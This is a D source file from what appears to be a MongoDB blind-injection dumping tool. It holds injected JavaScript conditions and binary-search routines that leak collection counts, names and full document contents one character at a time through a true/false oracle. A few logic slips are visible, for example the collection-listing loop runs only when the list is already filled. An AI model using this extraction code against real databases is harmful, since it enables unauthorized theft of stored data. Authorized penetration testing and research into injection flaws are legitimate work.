module mongrodump.database;

import std.format;

import mongrodump.query;
import mongrodump.oracle;

/**
 * Interface to the database through an injection.
 *
 * It allows dumping all or part of a database through an Oracle.
 */
class Database {
    ulong    collectionNumber;
    string[] collections;
    Oracle   oracle;

    /** Builds with a given oracle */
    this(Oracle oracle) {
        this.oracle = oracle;
        collectionNumber = getCollectionNumber();
    }

    /** Number of collections existing in the database */
    ulong getCollectionNumber(ulong maxNumber=10_000) {
        if (collectionNumber == 0) {
            oracle.getValue("db.getCollectionNames().length", 0, maxNumber);
        }
        return collectionNumber;
    }

    /** Name of the index-th collection */
    string getCollectionName(ulong index) {
        return oracle.getString("db.getCollectionNames()[%s]".format(index));
    }

    /** All collection names from the database */
    string[] getCollections() {
        if (collections.length != 0)
            for (ulong i ; i<getCollectionNumber ; i++)
                collections ~= getCollectionName(i);
        return collections;
    }

    /** Full content of a collection in the form of a JSON string */
    string getCollectionData(string collection) {
        return oracle.getString("tojsononeline(db.%s.find())"
                                .format(collection));
    }

    /** Full content of a collection in the form of a JSON string */
    ulong getCollectionSize(string collection, ulong maxSize=10_000) {
        return oracle.getValue("db.%s.find().length".format(collection),
                               0, maxSize);
    }

    /** Full content of a collection element in the form of a JSON string */
    string getCollectionElement(string collection, ulong index) {
        return oracle.getString("tojsononeline(db.%s.find()[%d])"
                                .format(collection, index));
    }
}

/**
 * Builds the part of the request comparing two numerical values.
 */
string greaterThan(T)(string what, T value) {
    return format("(%s) >= (%s)", what, cast(long)value);
}
unittest {
    assert("id".greaterThan(15)  == "(id) >= (15)");
    assert("id".greaterThan('a') == "(id) >= (97)");
}

/**
 * Returns a bounded numerical value leaked through an oracle.
 *
 * In case of error with the Oracle 0 is returned.
 */
T getValue(T)(Oracle oracle, string what, T from, T to) {
    import std.exception: enforce;
    enforce(from <= to, "Wrong order of arguments");

    while (true) {
        T pivot = cast(T)(from + (to - from) / 2);

        if (pivot == from) {
            final switch (oracle.ask(what.greaterThan(to))) {
                case OracleAnswer.Yes:
                    return to;
                case OracleAnswer.No:
                    return from;
                case OracleAnswer.Error:
                    return 0;
            }
        }
        else {
            final switch (oracle.ask(what.greaterThan(pivot))) {
                case OracleAnswer.Yes:
                    from = pivot;
                    break;

                case OracleAnswer.No:
                    to = pivot;
                    break;

                case OracleAnswer.Error:
                    return 0;
            }
        }
    }
}
unittest {
    auto query  = new TestQuery();
    auto oracle = new Oracle(query, "True", "False");

    query.answer = 97;
    assert(oracle.getValue("none", 0, 200) == 0);
    assert(oracle.getValue("id",   0, 200) == 97);
    assert(oracle.getValue("id", 'a', 'z') == 'a');

    query.answer = 'z';
    assert(oracle.getValue("id",   0, 200) == 122);
    assert(oracle.getValue("id", 'a', 'z') == 'z');
}

/**
 * Returns a string leaked through an oracle.
 *
 * By default, only supports strings shorter than maxValue characters.
 */
string getString(Oracle oracle, string what, ulong maxValue=1_000_000_000) {
    immutable length = oracle.getValue("%s.length".format(what), 0, maxValue);

    string result;
    for (ulong i ; i<length ; i++)
        result ~= cast(char) oracle.getValue("%s[%d]".format(what, i), 0, 128);

    return result;
}
